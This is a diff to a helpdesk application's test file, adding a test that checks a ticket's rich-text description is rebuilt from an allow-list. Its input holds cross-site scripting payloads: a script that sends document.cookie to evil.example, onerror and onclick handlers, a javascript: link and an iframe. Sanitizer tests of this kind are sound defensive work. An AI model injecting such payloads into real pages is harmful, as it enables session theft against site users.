@@ -287,6 +287,35 @@ test('from email: the sender found or added as a contact, the first team', async
   expect(values[1]?.['partner']).toBe(values[0]?.['partner']);
 });
 
+test('a ticket’s description is rich text: what is saved through the API is rebuilt from the allow-list (RFC 0034)', async () => {
+  const made = await call('POST', T, 'mona', {
+    subject: 'Formatted',
+    team,
+    email: 'rich@customer.example',
+    description:
+      '<h2>Steps</h2><p>It <strong>fails</strong> on <a href="https://shop.example/cart" onclick="steal()">the cart</a>.</p>' +
+      '<script>fetch("https://evil.example/" + document.cookie)</script><img src=x onerror=alert(1)>' +
+      '<p style="position:fixed">and <a href="javascript:alert(1)">here</a></p>',
+  });
+  expect(made.status, JSON.stringify(made.json)).toBe(201);
+  const stored = (await read(made.json.id, 'description')).description as string;
+  expect(stored).toBe(
+    '<h2>Steps</h2><p>It <strong>fails</strong> on <a href="https://shop.example/cart" target="_blank" rel="noopener noreferrer nofollow">the cart</a>.</p>' +
+      '<p>and here</p>',
+  );
+  // On a change too; plain text stays plain text.
+  await call('PATCH', `${T}/${made.json.id}`, 'mona', {
+    description: '<iframe src="https://evil.example"></iframe>Call back at 5 < 6',
+  });
+  expect((await read(made.json.id, 'description')).description).toBe('Call back at 5 &lt; 6');
+  // The database holds what was rebuilt, not what was sent.
+  const [row] = await driver.query<{ description: string }>({
+    text: 'SELECT description FROM helpdesk_ticket WHERE id = $1',
+    params: [made.json.id],
+  });
+  expect(row?.description).toBe('Call back at 5 &lt; 6');
+});
+
 test('a team on a working calendar: its holidays are not counted towards the SLA', async () => {
   // A calendar open around the clock, closed from yesterday to three days from now (a long holiday).
   const day = (offset: number) =>
